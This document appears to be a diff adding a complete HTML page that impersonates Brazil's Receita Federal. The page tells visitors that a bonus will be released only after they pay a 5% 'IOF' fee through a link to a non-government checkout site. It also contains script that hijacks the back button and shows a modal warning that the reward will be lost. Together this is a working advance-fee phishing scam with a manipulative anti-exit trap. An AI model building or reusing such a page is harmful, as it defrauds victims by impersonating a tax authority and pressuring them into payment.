@@ -1,0 +1,118 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cálculo de IOF - Receita Federal</title>
+    <link rel="stylesheet" href="css/style.css">
+<script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="abc60e07-8140-4133-b5df-23c871ba9de6"
+>
+</script>
+</head>
+<body>
+
+    <header class="main-header">
+        <div class="container">
+            <div class="logo-area">
+                <img src="images/logo.png" alt="Receita Federal" class="logo">
+                <div class="brand-text">
+                    <span class="title">Serviços do Contribuinte</span>
+                    <span class="subtitle">Portal de Serviços da Receita</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="top-info">
+            <span class="category-tag">IOF sobre o bônus</span>
+        </div>
+
+        <section class="hero">
+            <h1>Resumo do Tributo</h1>
+            <p>Detalhamento da alíquota aplicada para fins de regularização.</p>
+        </section>
+
+        <div class="calculator-card">
+            <div class="calc-header">Memória de Cálculo</div>
+            
+            <div class="calc-row">
+                <span>Valor do Bônus:</span>
+                <span class="value">R$ 2.693,82</span>
+            </div>
+            
+            <div class="calc-row">
+                <span>Alíquota de IOF:</span>
+                <span class="value badge-blue">5%</span>
+            </div>
+
+            <hr class="divider">
+
+            <div class="calc-row result">
+                <span>Total a recolher:</span>
+                <span class="value highlight" id="taxa-resultado">R$ 134,69</span>
+            </div>
+
+            <a href="https://www.pagamentos-seguro.link/checkout/7a1df9fe-a8ff-4c86-a3ff-3ce632eefadb" class="btn-gov" style="text-decoration:none;">
+                Gerar DARF para pagamento
+            </a>
+        </div>
+    </main>
+        <div class="alert-box">
+    <div class="alert-icon">⚠️</div>
+    <div class="alert-content">
+        <strong>Atenção:</strong> A liberação do montante principal está condicionada à liquidação integral da guia acima. 
+        O descumprimento do prazo de recolhimento impossibilita o processamento e a transferência definitiva dos valores para a conta de destino.
+    </div>
+    </div>
+
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Portal de Serviços</h4>
+                    <ul>
+                        <li><a href="#">Privacidade</a></li>
+                        <li><a href="#">Termos de Uso</a></li>
+                        <li><a href="#">Acessibilidade</a></li>
+                    </ul>
+                </div>
+                <div class="footer-logo">
+                    <img src="images/logo.png" alt="Logo Receita Federal" class="footer-img">
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2026 Secretaria da Receita Federal do Brasil. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+
+
+<!-- Modal Back Redirect -->
+<div id="overlay-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:99999;justify-content:center;align-items:center;">
+  <div style="background:#fff;border-radius:16px;padding:28px 24px;max-width:340px;width:90%;text-align:center;font-family:sans-serif;">
+    <div style="font-size:2rem;margin-bottom:12px;">⚠️</div>
+    <h2 style="font-size:1.2rem;margin-bottom:8px;color:#111;">Tem certeza que quer sair?</h2>
+    <p style="color:#555;font-size:0.9rem;margin-bottom:20px;">Seu saldo será cancelado e você perderá sua recompensa!</p>
+    <button id="btn-finalizar" style="width:100%;padding:14px;background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:700;cursor:pointer;margin-bottom:10px;">✅ Continuar e Resgatar</button>
+    <button id="btn-sair" style="width:100%;padding:12px;background:none;border:none;color:#999;font-size:0.85rem;cursor:pointer;">Sair mesmo assim</button>
+  </div>
+</div>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function () {
+    history.pushState(null, null, location.href);
+    document.getElementById("overlay-modal").style.display = "flex";
+  });
+  document.getElementById("btn-finalizar").addEventListener("click", function () {
+    document.getElementById("overlay-modal").style.display = "none";
+  });
+  document.getElementById("btn-sair").addEventListener("click", function () {
+    window.history.back();
+  });
+});
+</script>
+</body></html>
